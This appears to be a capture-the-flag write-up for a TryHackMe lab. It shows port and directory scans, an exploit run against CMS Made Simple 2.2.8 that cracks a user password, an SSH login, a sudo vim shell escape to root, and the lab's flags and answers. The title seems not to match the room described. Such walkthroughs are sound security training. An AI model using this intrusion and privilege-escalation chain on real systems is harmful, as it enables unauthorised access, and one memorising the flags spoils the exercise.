# Bounty Hacker @TryHackMe

Difficulty: EASY

Keywords and tools: 

Questions:

### nmap scan
```
$ nmap -sV -n -v -Pn -p- -T4 -A 10.10.211.172
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.155.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
And we have answers to questions 

How many services are running under port 1000?

What is running on the higher port?

### dirb
```
---- Scanning URL: http://10.10.211.172/ ----
+ http://10.10.211.172/index.html (CODE:200|SIZE:11321)                                                                                                      
+ http://10.10.211.172/robots.txt (CODE:200|SIZE:929)                                                                                                        
+ http://10.10.211.172/server-status (CODE:403|SIZE:301)                                                                                                     
==> DIRECTORY: http://10.10.211.172/simple/                                                                                                                  
                                                                                                                                                             
---- Entering directory: http://10.10.211.172/simple/ ----
==> DIRECTORY: http://10.10.211.172/simple/admin/                                                                                                            
==> DIRECTORY: http://10.10.211.172/simple/assets/                                                                                                           
==> DIRECTORY: http://10.10.211.172/simple/doc/                                                                                                              
+ http://10.10.211.172/simple/index.php (CODE:200|SIZE:19993)                                                                                                
==> DIRECTORY: http://10.10.211.172/simple/lib/                                                                                                              
==> DIRECTORY: http://10.10.211.172/simple/modules/                                                                                                          
==> DIRECTORY: http://10.10.211.172/simple/tmp/                                                                                                              
==> DIRECTORY: http://10.10.211.172/simple/uploads/                                                                                                          
                                                                                                                                                             
---- Entering directory: http://10.10.211.172/simple/admin/ ----
+ http://10.10.211.172/simple/admin/index.php (CODE:302|SIZE:0)                                                                                              
==> DIRECTORY: http://10.10.211.172/simple/admin/lang/                                                                                                       
==> DIRECTORY: http://10.10.211.172/simple/admin/plugins/                                                                                                    
==> DIRECTORY: http://10.10.211.172/simple/admin/templates/                                                                                                  
==> DIRECTORY: http://10.10.211.172/simple/admin/themes/                                    
```
Visit /simple and we can see web app is running Made Simple 2.2.8
Google cms made simple 2.2.8 exploit and you should find https://www.exploit-db.com/exploits/46635

And then we have answers for the questions 

What's the CVE you're using against the application?

To what kind of vulnerability is the application vulnerable?

### Copy and run the exploit.
```
$python3 exploit.py -u http://10.10.211.172/simple/ --crack --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best110.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
### SSH 
```
$ ssh mitch@10.10.76.241 -p 2222
The authenticity of host '[10.10.76.241]:2222 ([10.10.76.241]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.76.241]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.76.241's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt  
G00d j0b, keep up!
```
Above is the answer to question What's the user flag?

Next question was Is there any other user in the home directory? What's its name?
```
$ ls
user.txt
$ cat user.txt  
G00d j0b, keep up!
$ cd /home
$ ls
mitch  sunbath
```
What can you leverage to spawn a privileged shell?
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ sudo vim
```
Go to https://gtfobins.github.io/gtfobins/vim/

Copy paste 

:set shell=/bin/sh

:shell

to vim and press enter
```
# whoami
root
# ls
user.txt
# cd /root
# ls
root.txt
# cat root.txt  
W3ll d0n3. You made it!
# 
```

